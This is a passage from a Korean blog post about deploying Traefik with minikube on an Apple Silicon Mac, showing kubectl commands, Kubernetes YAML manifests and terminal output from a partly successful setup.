되겠네요.\npwd # ${HOME}/traefik-practice/00_quickstart apply -f 01-account.yml apiVersion: v1 kind: ServiceAccount metadata: name: traefik-account 04-3. ClusterRoleBinding 적용 당연한 이야기지만, ClusterRole과 ServiceAccount을 적용합니다.\npwd # ${HOME}/traefik-practice/00_quickstart apply -f 02-role-binding.yml kind: ClusterRoleBinding apiVersion: rbac.authorization.k8s.io/v1 metadata: name: traefik-role-binding roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: traefik-role subjects: - kind: ServiceAccount name: traefik-account namespace: default 04-4. traefik services(dashboard, LB) 적용 traefik의 기능인 dashboard와 LoadBalancer를 서비스해봅시다.\n사실은 로드밸런싱을 통해 dashboard에 8080 포트포워딩 해주는 것이지요. 80포트의 경우, 다음 스텝인 whoami 테스트를 위한 포트포워딩 작업입니다. ingress도 결국엔 pod 및 service를 통해 동작하는 것이므로, traefik Deployment를 구성하여 추가적으로 컨테이너를 확장하도록 구현하는 작업이라고 합니다.\npwd # ${HOME}/traefik-practice/00_quickstart apply -f 03-traefik-services.yml kubectl tunneling 활성화\n위의 명령어를 실행하면, 사전에 말씀드린 터미널 창에서 암호를 입력하라고 뜰 것입니다.\n아래 예제처럼, 중간에 뭔가 틀렸다 싶으면\u0026hellip;\nkubectl delete -f 03-traefik-services.yml 명령어를 통해\n삭제하고 다시 적용을 해보면 됩니다.\nprompt in kubectl tunneling terminal\n❯ minikube tunnel ✅ Tunnel successfully started 📌 NOTE: Please do not close this terminal as this process must stay alive for the tunnel to be accessible ... 🏃 Starting tunnel for service traefik-dashboard-service. ❗ The service/ingress traefik-web-service requires privileged ports to be exposed: [80] 🔑 sudo permission will be asked for it. 🏃 Starting tunnel for service traefik-web-service. Password: ✋ Stopping tunnel for service traefik-dashboard-service. ✋ Stopping tunnel for service traefik-web-service. E0204 22:51:14.129905 25131 ssh_tunnel.go:183] error stopping ssh tunnel: operation not permitted 🏃 Starting tunnel for service traefik-dashboard-service. ❗ The service/ingress traefik-web-service requires privileged ports to be exposed: [80] 🔑 sudo permission will be asked for it. 🏃 Starting tunnel for service traefik-web-service. kind: Deployment apiVersion: apps/v1 metadata: name: traefik-deployment labels: app: traefik spec: replicas: 1 selector: matchLabels: app: traefik template: metadata: labels: app: traefik spec: serviceAccountName: traefik-account containers: - name: traefik image: traefik:v2.9 args: - --api.insecure - --providers.kubernetesingress ports: - name: web containerPort: 80 - name: dashboard containerPort: 8080 --- apiVersion: v1 kind: Service metadata: name: traefik-dashboard-service spec: type: LoadBalancer ports: - port: 8080 targetPort: dashboard selector: app: traefik --- apiVersion: v1 kind: Service metadata: name: traefik-web-service spec: type: LoadBalancer ports: - targetPort: web port: 80 selector: app: traefik 04-5. whoami 서비스 적용 여기서부터는 whoami 서비스까지 제대로 도달하지 않아, 참고로만 하면 좋을 것 같습니다.\npwd # ${HOME}/traefik-practice/00_quickstart apply -f 04-whoami-service.yml apply -f 05-whoami-ingress.yml kind: Deployment apiVersion: apps/v1 metadata: name: whoami labels: app: whoami spec: replicas: 1 selector: matchLabels: app: whoami template: metadata: labels: app: whoami spec: containers: - name: whoami image: traefik/whoami ports: - name: web containerPort: 80 --- apiVersion: v1 kind: Service metadata: name: whoami spec: ports: - name: web port: 80 targetPort: web selector: app: whoami apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: whoami-ingress spec: rules: - http: paths: - path: /whoami pathType: Prefix backend: service: name: whoami port: name: web minikube 상태 및 traefik 대시보드 확인 minikube 상태 확인\nkubectl get svc,pod,ingress #NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE #service/kubernetes ClusterIP 10.96.0.1 \u0026lt;none\u0026gt; 443/TCP 51m #service/traefik-dashboard-service LoadBalancer 10.102.66.98 127.0.0.1 8080:30024/TCP 50m #service/traefik-web-service LoadBalancer 10.110.10.216 127.0.0.1 80:31761/TCP 50m #service/whoami ClusterIP 10.99.168.47 \u0026lt;none\u0026gt; 80/TCP 33m #NAME READY STATUS RESTARTS AGE #pod/traefik-deployment-bd6c9d49-rvzns 1/1 Running 0 32m #pod/whoami-6d97bf7dcb-r744j 1/1 Running 0 9s #NAME CLASS HOSTS ADDRESS PORTS AGE #ingress.networking.k8s.io/whoami-ingress nginx localhost 192.168.49.2 80 10m traefik 대시보드 확인\nreference Traefik Quick Start w/k8s faun.pub CloudNet@ Enable ingress 1 Enable ingress 2 ingress minikube ","date":"2023-02-05T04:54:06+09:00","permalink":"https://blog.minseong.xyz/post/traefik-with-minikube-in-m1/","section":"post","tags":["minikube","CloudNet@","M1","Traefik"],"title":"Traefik을 활용한 minikube 예제 구현시도 w/Apple Silicon"}]